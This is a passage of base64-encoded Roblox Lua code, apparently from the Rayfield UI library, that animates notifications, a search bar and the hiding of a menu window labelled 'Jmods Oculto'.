ltYWdlID0gJ3JieGFzc2V0aWQ6Ly8nLi5hc3NldC5pZAoJCQkJbmV3Tm90aWZpY2F0aW9uLkljb24uSW1hZ2VSZWN0T2Zmc2V0ID0gYXNzZXQuaW1hZ2VSZWN0T2Zmc2V0CgkJCQluZXdOb3RpZmljYXRpb24uSWNvbi5JbWFnZVJlY3RTaXplID0gYXNzZXQuaW1hZ2VSZWN0U2l6ZQoJCQllbHNlCgkJCQluZXdOb3RpZmljYXRpb24uSWNvbi5JbWFnZSA9IGdldEFzc2V0VXJpKGRhdGEuSW1hZ2UpCgkJCWVuZAoJCWVsc2UKCQkJbmV3Tm90aWZpY2F0aW9uLkljb24uSW1hZ2UgPSAicmJ4YXNzZXRpZDovLyIgLi4gMAoJCWVuZAoKCQktLSBTZXQgaW5pdGlhbCB0cmFuc3BhcmVuY3kgdmFsdWVzCgoJCW5ld05vdGlmaWNhdGlvbi5UaXRsZS5UZXh0Q29sb3IzID0gU2VsZWN0ZWRUaGVtZS5UZXh0Q29sb3IKCQluZXdOb3RpZmljYXRpb24uRGVzY3JpcHRpb24uVGV4dENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuVGV4dENvbG9yCgkJbmV3Tm90aWZpY2F0aW9uLkJhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkJhY2tncm91bmQKCQluZXdOb3RpZmljYXRpb24uVUlTdHJva2UuQ29sb3IgPSBTZWxlY3RlZFRoZW1lLlRleHRDb2xvcgoJCW5ld05vdGlmaWNhdGlvbi5JY29uLkltYWdlQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5UZXh0Q29sb3IKCgkJbmV3Tm90aWZpY2F0aW9uLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCgkJbmV3Tm90aWZpY2F0aW9uLlRpdGxlLlRleHRUcmFuc3BhcmVuY3kgPSAxCgkJbmV3Tm90aWZpY2F0aW9uLkRlc2NyaXB0aW9uLlRleHRUcmFuc3BhcmVuY3kgPSAxCgkJbmV3Tm90aWZpY2F0aW9uLlVJU3Ryb2tlLlRyYW5zcGFyZW5jeSA9IDEKCQluZXdOb3RpZmljYXRpb24uU2hhZG93LkltYWdlVHJhbnNwYXJlbmN5ID0gMQoJCW5ld05vdGlmaWNhdGlvbi5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDgwMCkKCQluZXdOb3RpZmljYXRpb24uSWNvbi5JbWFnZVRyYW5zcGFyZW5jeSA9IDEKCQluZXdOb3RpZmljYXRpb24uSWNvbi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQoKCQl0YXNrLndhaXQoKQoKCQluZXdOb3RpZmljYXRpb24uVmlzaWJsZSA9IHRydWUKCgkJaWYgZGF0YS5BY3Rpb25zIHRoZW4KCQkJd2FybignUmF5ZmllbGQgfCBOb3Qgc2VlaW5nIHlvdXIgYWN0aW9ucyBpbiBub3RpZmljYXRpb25zPycpCgkJCXByaW50KCJOb3RpZmljYXRpb24gQWN0aW9ucyBhcmUgYmVpbmcgc3Vuc2V0IGZvciBub3csIGtlZXAgdXAgdG8gZGF0ZSBvbiB3aGVuIHRoZXkncmUgYmFjayBpbiB0aGUgZGlzY29yZC4gKHNpcml1cy5tZW51L2Rpc2NvcmQpIikKCQllbmQKCgkJLS0gQ2FsY3VsYXRlIHRleHRib3VuZHMgYW5kIHNldCBpbml0aWFsIHZhbHVlcwoJCWxvY2FsIGJvdW5kcyA9IHtuZXdOb3RpZmljYXRpb24uVGl0bGUuVGV4dEJvdW5kcy5ZLCBuZXdOb3RpZmljYXRpb24uRGVzY3JpcHRpb24uVGV4dEJvdW5kcy5ZfQoJCW5ld05vdGlmaWNhdGlvbi5TaXplID0gVURpbTIubmV3KDEsIC02MCwgMCwgLU5vdGlmaWNhdGlvbnM6RmluZEZpcnN0Q2hpbGQoIlVJTGlzdExheW91dCIpLlBhZGRpbmcuT2Zmc2V0KQoKCQluZXdOb3RpZmljYXRpb24uSWNvbi5TaXplID0gVURpbTIubmV3KDAsIDMyLCAwLCAzMikKCQluZXdOb3RpZmljYXRpb24uSWNvbi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAyMCwgMC41LCAwKQoKCQlUd2VlblNlcnZpY2U6Q3JlYXRlKG5ld05vdGlmaWNhdGlvbiwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7U2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCBtYXRoLm1heChib3VuZHNbMV0gKyBib3VuZHNbMl0gKyAzMSwgNjApKX0pOlBsYXkoKQoKCQl0YXNrLndhaXQoMC4xNSkKCQlUd2VlblNlcnZpY2U6Q3JlYXRlKG5ld05vdGlmaWNhdGlvbiwgVHdlZW5JbmZvLm5ldygwLjQsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuNDV9KTpQbGF5KCkKCQlUd2VlblNlcnZpY2U6Q3JlYXRlKG5ld05vdGlmaWNhdGlvbi5UaXRsZSwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCgkJdGFzay53YWl0KDAuMDUpCgoJCVR3ZWVuU2VydmljZTpDcmVhdGUobmV3Tm90aWZpY2F0aW9uLkljb24sIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0ltYWdlVHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoKCQl0YXNrLndhaXQoMC4wNSkKCQlUd2VlblNlcnZpY2U6Q3JlYXRlKG5ld05vdGlmaWNhdGlvbi5EZXNjcmlwdGlvbiwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDAuMzV9KTpQbGF5KCkKCQlUd2VlblNlcnZpY2U6Q3JlYXRlKG5ld05vdGlmaWNhdGlvbi5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjQsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMC45NX0pOlBsYXkoKQoJCVR3ZWVuU2VydmljZTpDcmVhdGUobmV3Tm90aWZpY2F0aW9uLlNoYWRvdywgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7SW1hZ2VUcmFuc3BhcmVuY3kgPSAwLjgyfSk6UGxheSgpCgoJCWxvY2FsIHdhaXREdXJhdGlvbiA9IG1hdGgubWluKG1hdGgubWF4KCgjbmV3Tm90aWZpY2F0aW9uLkRlc2NyaXB0aW9uLlRleHQgKiAwLjEpICsgMi41LCAzKSwgMTApCgkJdGFzay53YWl0KGRhdGEuRHVyYXRpb24gb3Igd2FpdER1cmF0aW9uKQoKCQluZXdOb3RpZmljYXRpb24uSWNvbi5WaXNpYmxlID0gZmFsc2UKCQlUd2VlblNlcnZpY2U6Q3JlYXRlKG5ld05vdGlmaWNhdGlvbiwgVHdlZW5JbmZvLm5ldygwLjQsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQlUd2VlblNlcnZpY2U6Q3JlYXRlKG5ld05vdGlmaWNhdGlvbi5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjQsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCVR3ZWVuU2VydmljZTpDcmVhdGUobmV3Tm90aWZpY2F0aW9uLlNoYWRvdywgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7SW1hZ2VUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShuZXdOb3RpZmljYXRpb24uVGl0bGUsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShuZXdOb3RpZmljYXRpb24uRGVzY3JpcHRpb24sIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgoJCVR3ZWVuU2VydmljZTpDcmVhdGUobmV3Tm90aWZpY2F0aW9uLCBUd2VlbkluZm8ubmV3KDEsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7U2l6ZSA9IFVEaW0yLm5ldygxLCAtOTAsIDAsIDApfSk6UGxheSgpCgoJCXRhc2sud2FpdCgxKQoKCQlUd2VlblNlcnZpY2U6Q3JlYXRlKG5ld05vdGlmaWNhdGlvbiwgVHdlZW5JbmZvLm5ldygxLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1NpemUgPSBVRGltMi5uZXcoMSwgLTkwLCAwLCAtTm90aWZpY2F0aW9uczpGaW5kRmlyc3RDaGlsZCgiVUlMaXN0TGF5b3V0IikuUGFkZGluZy5PZmZzZXQpfSk6UGxheSgpCgoJCW5ld05vdGlmaWNhdGlvbi5WaXNpYmxlID0gZmFsc2UKCQluZXdOb3RpZmljYXRpb246RGVzdHJveSgpCgllbmQpCmVuZAoKbG9jYWwgZnVuY3Rpb24gb3BlblNlYXJjaCgpCglzZWFyY2hPcGVuID0gdHJ1ZQoKCU1haW4uU2VhcmNoLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCglNYWluLlNlYXJjaC5TaGFkb3cuSW1hZ2VUcmFuc3BhcmVuY3kgPSAxCglNYWluLlNlYXJjaC5JbnB1dC5UZXh0VHJhbnNwYXJlbmN5ID0gMQoJTWFpbi5TZWFyY2guU2VhcmNoLkltYWdlVHJhbnNwYXJlbmN5ID0gMQoJTWFpbi5TZWFyY2guVUlTdHJva2UuVHJhbnNwYXJlbmN5ID0gMQoJTWFpbi5TZWFyY2guU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCA4MCkKCU1haW4uU2VhcmNoLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMCwgNzApCgoJTWFpbi5TZWFyY2guSW5wdXQuSW50ZXJhY3RhYmxlID0gdHJ1ZQoKCU1haW4uU2VhcmNoLlZpc2libGUgPSB0cnVlCgoJZm9yIF8sIHRhYmJ0biBpbiBpcGFpcnMoVGFiTGlzdDpHZXRDaGlsZHJlbigpKSBkbwoJCWlmIHRhYmJ0bi5DbGFzc05hbWUgPT0gIkZyYW1lIiBhbmQgdGFiYnRuLk5hbWUgfj0gIlBsYWNlaG9sZGVyIiB0aGVuCgkJCXRhYmJ0bi5JbnRlcmFjdC5WaXNpYmxlID0gZmFsc2UKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZSh0YWJidG4sIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUodGFiYnRuLlRpdGxlLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKHRhYmJ0bi5JbWFnZSwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7SW1hZ2VUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUodGFiYnRuLlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJZW5kCgllbmQKCglNYWluLlNlYXJjaC5JbnB1dDpDYXB0dXJlRm9jdXMoKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShNYWluLlNlYXJjaC5TaGFkb3csIFR3ZWVuSW5mby5uZXcoMC4wNSwgRW51bS5FYXNpbmdTdHlsZS5RdWludCksIHtJbWFnZVRyYW5zcGFyZW5jeSA9IDAuOTV9KTpQbGF5KCkKCVR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbi5TZWFyY2gsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1Bvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMCwgNTcpLCBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC45fSk6UGxheSgpCglUd2VlblNlcnZpY2U6Q3JlYXRlKE1haW4uU2VhcmNoLlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUcmFuc3BhcmVuY3kgPSAwLjh9KTpQbGF5KCkKCVR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbi5TZWFyY2guSW5wdXQsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAwLjJ9KTpQbGF5KCkKCVR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbi5TZWFyY2guU2VhcmNoLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtJbWFnZVRyYW5zcGFyZW5jeSA9IDAuNX0pOlBsYXkoKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShNYWluLlNlYXJjaCwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7U2l6ZSA9IFVEaW0yLm5ldygxLCAtMzUsIDAsIDM1KX0pOlBsYXkoKQplbmQKCmxvY2FsIGZ1bmN0aW9uIGNsb3NlU2VhcmNoKCkKCXNlYXJjaE9wZW4gPSBmYWxzZQoKCVR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbi5TZWFyY2gsIFR3ZWVuSW5mby5uZXcoMC4zNSwgRW51bS5FYXNpbmdTdHlsZS5RdWludCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMSwgU2l6ZSA9IFVEaW0yLm5ldygxLCAtNTUsIDAsIDMwKX0pOlBsYXkoKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShNYWluLlNlYXJjaC5TZWFyY2gsIFR3ZWVuSW5mby5uZXcoMC4xNSwgRW51bS5FYXNpbmdTdHlsZS5RdWludCksIHtJbWFnZVRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCVR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbi5TZWFyY2guU2hhZG93LCBUd2VlbkluZm8ubmV3KDAuMTUsIEVudW0uRWFzaW5nU3R5bGUuUXVpbnQpLCB7SW1hZ2VUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCglUd2VlblNlcnZpY2U6Q3JlYXRlKE1haW4uU2VhcmNoLlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuMTUsIEVudW0uRWFzaW5nU3R5bGUuUXVpbnQpLCB7VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShNYWluLlNlYXJjaC5JbnB1dCwgVHdlZW5JbmZvLm5ldygwLjE1LCBFbnVtLkVhc2luZ1N0eWxlLlF1aW50KSwge1RleHRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgoJZm9yIF8sIHRhYmJ0biBpbiBpcGFpcnMoVGFiTGlzdDpHZXRDaGlsZHJlbigpKSBkbwoJCWlmIHRhYmJ0bi5DbGFzc05hbWUgPT0gIkZyYW1lIiBhbmQgdGFiYnRuLk5hbWUgfj0gIlBsYWNlaG9sZGVyIiB0aGVuCgkJCXRhYmJ0bi5JbnRlcmFjdC5WaXNpYmxlID0gdHJ1ZQoJCQlpZiB0b3N0cmluZyhFbGVtZW50cy5VSVBhZ2VMYXlvdXQuQ3VycmVudFBhZ2UpID09IHRhYmJ0bi5UaXRsZS5UZXh0IHRoZW4KCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUodGFiYnRuLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZSh0YWJidG4uSW1hZ2UsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0ltYWdlVHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZSh0YWJidG4uVGl0bGUsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCgkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKHRhYmJ0bi5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQllbHNlCgkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKHRhYmJ0biwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuN30pOlBsYXkoKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZSh0YWJidG4uSW1hZ2UsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0ltYWdlVHJhbnNwYXJlbmN5ID0gMC4yfSk6UGxheSgpCgkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKHRhYmJ0bi5UaXRsZSwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDAuMn0pOlBsYXkoKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZSh0YWJidG4uVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDAuNX0pOlBsYXkoKQoJCQllbmQKCQllbmQKCWVuZAoKCU1haW4uU2VhcmNoLklucHV0LlRleHQgPSAnJwoJTWFpbi5TZWFyY2guSW5wdXQuSW50ZXJhY3RhYmxlID0gZmFsc2UKZW5kCgpsb2NhbCBmdW5jdGlvbiBIaWRlKG5vdGlmeTogYm9vbGVhbj8pCglpZiBNUHJvbXB0IHRoZW4KCQlNUHJvbXB0LlRpdGxlLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQoJCU1Qcm9tcHQuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLCAtNTApCgkJTVByb21wdC5TaXplID0gVURpbTIubmV3KDAsIDQwLCAwLCAxMCkKCQlNUHJvbXB0LkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCgkJTVByb21wdC5UaXRsZS5UZXh0VHJhbnNwYXJlbmN5ID0gMQoJCU1Qcm9tcHQuVmlzaWJsZSA9IHRydWUKCWVuZAoKCXRhc2suc3Bhd24oY2xvc2VTZWFyY2gpCgoJRGVib3VuY2UgPSB0cnVlCglpZiBub3RpZnkgdGhlbgoJCWlmIHVzZU1vYmlsZVByb21wdCB0aGVuIAoJCQlSYXlmaWVsZExpYnJhcnk6Tm90aWZ5KHtUaXRsZSA9ICJKbW9kcyBPY3VsdG8iLCBDb250ZW50ID0gIlZ1ZWx2ZSBhIHZlcmxvIHBpc2FuZG8gbGEgdGVjbGEgJ1Nob3cgUmF5ZmllbGQnLiIsIER1cmF0aW9uID0gNywgSW1hZ2UgPSA0NDAwNjk3ODU1fSkKCQllbHNlCgkJCVJheWZpZWxkTGlicmFyeTpOb3RpZnkoe1RpdGxlID0gIkptb2RzIE9jdWx0byIsIENvbnRlbnQgPSBgVnVlbHZlIGEgdmVybG8gcGlzYW5kbyBsYSB0ZWNsYSB7c2V0dGluZ3NUYWJsZS5HZW5lcmFsLnJheWZpZWxkT3Blbi5WYWx1ZSBvciAnSyd9LmAsIER1cmF0aW9uID0gNywgSW1hZ2UgPSA0NDAwNjk3ODU1fSkKCQllbmQKCWVuZAoKCVR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbiwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7U2l6ZSA9IFVEaW0yLm5ldygwLCA0NzAsIDAsIDApfSk6UGxheSgpCglUd2VlblNlcnZpY2U6Q3JlYXRlKE1haW4uVG9wYmFyLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtTaXplID0gVURpbTIubmV3KDAsIDQ3MCwgMCwgNDUpfSk6UGxheSgpCglUd2VlblNlcnZpY2U6Q3JlYXRlKE1haW4sIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCglUd2VlblNlcnZpY2U6Q3JlYXRlKE1haW4uVG9wYmFyLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShNYWluLlRvcGJhci5EaXZpZGVyLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShNYWluLlRvcGJhci5Db3JuZXJSZXBhaXIsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCglUd2VlblNlcnZpY2U6Q3JlYXRlKE1haW4uVG9wYmFyLlRpdGxlLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShNYWluLlNoYWRvdy5JbWFnZSwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7SW1hZ2VUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCglUd2VlblNlcnZpY2U6Q3JlYXRlKFRvcGJhci5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShkcmFnQmFyQ29zbWV0aWMsIFR3ZWVuSW5mby5uZXcoMC4yNSwgRW51bS5FYXNpbmdTdHlsZS5CYWNrLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCglpZiB1c2VNb2JpbGVQcm9tcHQgYW5kIE1Qcm9tcHQgdGhlbgoJCVR3ZWVuU2VydmljZTpDcmVhdGUoTVByb21wdCwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7U2l6ZSA9IFVEaW0yLm5ldygwLCAxMjAsIDAsIDMwKSwgUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLCAyMCksIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjN9KTpQbGF5KCkKCQlUd2VlblNlcnZpY2U6Q3JlYXRlKE1Qcm9tcHQuVGl0bGUsIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAwLjN9KTpQbGF5KCkKCWVuZAoKCWZvciBfLCBUb3BiYXJCdXR0b24gaW4gaXBhaXJzKFRvcGJhcjpHZXRDaGlsZHJlbigpKSBkbwoJCWlmIFRvcGJhckJ1dHRvbi5DbGFzc05hbWUgPT0gIkltYWdlQnV0dG9uIiB0aGVuCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9wYmFyQnV0dG9uLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtJbWFnZVRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQllbmQKCWVuZAoKCWZvciBfLCB0YWJidG4gaW4gaXBhaXJzKFRhYkxpc3Q6R2V0Q2hpbGRyZW4oKSkgZG8KCQlpZiB0YWJidG4uQ2xhc3NOYW1lID09ICJGcmFtZSIgYW5kIHRhYmJ0bi5OYW1lIH49ICJQbGFjZWhvbGRlciIgdGhlbgoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKHRhYmJ0biwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZSh0YWJidG4uVGl0bGUsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUodGFiYnRuLkltYWdlLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtJbWFnZVRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZSh0YWJidG4uVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQllbmQKCWVuZAoKCWRyYWdJbnRlcmFjdC5WaXNpYmxlID0gZmFsc2UKCglmb3IgXywgdGFiIGluIGlwYWlycyhFbGVtZW50czpHZXRDaGlsZHJlbigpKSBkbwoJCWlmIHRhYi5OYW1lIH49ICJUZW1wbGF0ZSIgYW5kIHRhYi5DbGFzc05hbWUgPT0gIlNjcm9sbGluZ0ZyYW1lIiBhbmQgdGFiLk5hbWUgfj0gIlBsYWNlaG9sZGVyIiB0aGVuCgkJCWZvciBfLCBlbGVtZW50IGluIGlwYWlycyh0YWI6R2V0Q2hpbGRyZW4oKSkgZG8KCQkJCWlmIGVsZW1lbnQuQ2xhc3NOYW1lID09ICJGcmFtZSIgdGhlbgoJCQkJCWlmIGVsZW1lbnQuTmFtZSB+PSAiU2VjdGlvblNwYWNpbmciIGFuZCBlbGVtZW50Lk5hbWUgfj0gIlBsYWNlaG9sZGVyIiB0aGVuCgkJCQkJCWlmIGVsZW1lbnQuTmFtZSA9PSAiU2VjdGlvblRpdGxlIiBvciBlbGVtZW50Lk5hbWUgPT0gJ1NlYXJjaFRpdGxlLWZzZWZzZWZlc2ZzZWZlc2Zlc2ZUaGFua3MnIHRoZW4KCQkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoZWxlbWVudC5UaXRsZSwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQkJZWxzZWlmIGVsZW1lbnQuTmFtZSA9PSAnRGl2aWRlcicgdGhlbgoJCQkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShlbGVtZW50LkRpdmlkZXIsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4